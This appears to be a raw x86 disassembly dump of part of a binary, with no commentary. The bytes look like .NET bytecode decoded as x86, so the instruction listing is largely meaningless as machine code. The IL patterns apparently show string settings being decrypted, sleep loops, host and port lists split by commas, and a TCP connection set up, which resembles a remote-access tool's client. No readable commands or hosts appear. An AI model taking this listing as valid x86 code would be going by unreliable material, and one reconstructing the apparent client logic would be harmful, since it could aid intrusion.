  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	12 01                	adc    (%ecx),%al
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	6d                   	insl   (%dx),%es:(%edi)
  4028e2:	04 00                	add    $0x0,%al
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	20 05 00 70 80 04    	and    %al,0x4807000
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	04 72                	add    $0x72,%al
  4028f5:	d3 05 00 70 80 05    	roll   %cl,0x5807000
  4028fb:	00 00                	add    %al,(%eax)
  4028fd:	04 72                	add    $0x72,%al
  4028ff:	e7 05                	out    %eax,$0x5
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	01 06                	add    %eax,(%esi)
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	5b                   	pop    %ebx
  402914:	06                   	push   %es
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	0e                   	push   %cs
  40291e:	07                   	pop    %es
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	11 19                	adc    %ebx,(%ecx)
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	c4 20                	les    (%eax),%esp
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	77 21                	ja     0x40295e
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	2a 22                	sub    (%edx),%ah
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	dd 22                	frstor (%edx)
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	e1 22                	loope  0x402983
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	94                   	xchg   %eax,%esp
  4029a2:	23 00                	and    (%eax),%eax
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 9e 23 00       	add    $0x239e72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	9e                   	sahf
  402aa0:	23 00                	and    (%eax),%eax
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 a0 23    	add    %esp,0x23a07216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
